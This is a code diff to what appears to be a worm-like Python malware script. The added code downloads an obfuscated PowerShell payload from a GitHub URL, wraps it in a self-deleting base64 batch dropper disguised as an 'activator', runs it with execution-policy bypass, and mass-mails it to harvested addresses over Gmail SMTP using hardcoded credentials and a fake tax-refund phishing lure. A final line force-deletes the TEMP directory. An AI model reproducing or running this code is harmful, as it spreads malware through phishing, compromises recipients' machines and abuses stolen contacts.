@@ -77,6 +77,89 @@ def infect_host(host, file_path):
     except:
         pass
 
+def generate():
+    init_path = os.path.join(os.getenv('TEMP'), 'init.ps1')
+    bat_path = os.path.join(os.getenv('TEMP'), 'activator.bat')
+    init_link = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/obfuscated_initializer.ps1"
+    if not os.path.exists(init_path):
+        try:
+            r = requests.get(init_link)
+            with open(init_path, 'wb') as f:
+                f.write(r.content)
+        except: pass
+    with open(init_path, 'rb') as f:
+        c = base64.b64encode(f.read()).decode()
+        chunks = [c[i:i+6000] for i in range(0, len(c), 6000)]
+
+        bat_content = [
+            '@echo off',
+            'setlocal enabledelayedexpansion',
+            'set "exe_name=%~n0.exe"',
+            'echo Fetching Activation Keys...'
+        ]
+
+        for i, chunk in enumerate(chunks, 1):
+            bat_content.append(f'set "chunk{i}={chunk}"')
+
+        bat_content.extend([
+            '(', 
+            f'for /l %%n in (1,1,{len(chunks)}) do (',
+            '  set "chunk=!chunk%%n!"',
+            '  echo|set /p dummy="!chunk!"',
+            ')',
+            ') > "%temp%\\!exe_name!.b64"',
+            '',
+            f'powershell -Command "[IO.File]::WriteAllBytes(\'%temp%\\%exe_name%\', [Convert]::FromBase64String((Get-Content \'%temp%\\%exe_name%.b64\')))"',
+            'del "%temp%\\!exe_name!.b64"',
+            'powershell -ep bypass -noP -nonI start-process powershell.exe "{%temp%\\!exe_name!}"',
+            'del "%~f0"'
+        ])
+ 
+        with open(bat_path, "w", encoding='utf-8') as b:
+            b.write('\n'.join(bat_content))
+    return bat_path
+
+def send_a(bat_path, emails):
+    email_user = "defalttests@gmail.com"
+    email_pass = "ccoq gwxh jgos gqig"
+
+    with open(bat_path, 'rb') as f:
+        attachment_data = f.read()
+
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(email_user, password=email_pass)
+
+    for email in emails:
+        print(email)    
+        msg = MIMEMultipart()
+        msg['From'] = "J. Security LTD"
+        msg['To'] = email
+        msg['Subject'] = "URGENT: Your Tax Refund of $1,284.77 is Pending - Action Required!"
+
+        body = """Dear Valued Customer,
+
+Your immediate attention is required for the attached invoice.
+Failure to review within 24 hours may result in service disruption.
+
+Download and open the PDF for full details.
+
+Sincerely,
+Account Management Team"""
+        msg.attach(MIMEText(body, 'plain'))
+
+        part = MIMEBase('application', 'octet-stream')
+        part.set_payload(attachment_data)
+        encoders.encode_base64(part)
+        part.add_header('Content-Disposition', f"attachment; filename= activator.bat")
+        msg.attach(part)
+        server.sendmail(email_user, [email], msg.as_string())
+        print(f"Sent to {email}")
+    
+    server.quit()
+        
+    print(len(emails))
+
 def decode_with_fallback(data):
     for encoding in ['utf-8', 'utf-16-le', 'latin1']:
         try:
@@ -495,11 +578,9 @@ except Exception as e:
     print(f"ERROR FETCHING WIN CREDS : {e}")
     
 emails = list(set(emails))
+bat_path = generate()
 
 print("AFTER FILTERINGGG")
-for email in emails:
-    print(email)
-        
-print(len(emails))
+send_a(bat_path, emails)
 
 os.system(f"powershell remove-item -path {os.getenv("TEMP")} -force -recurse -erroraction silentlycontinue")
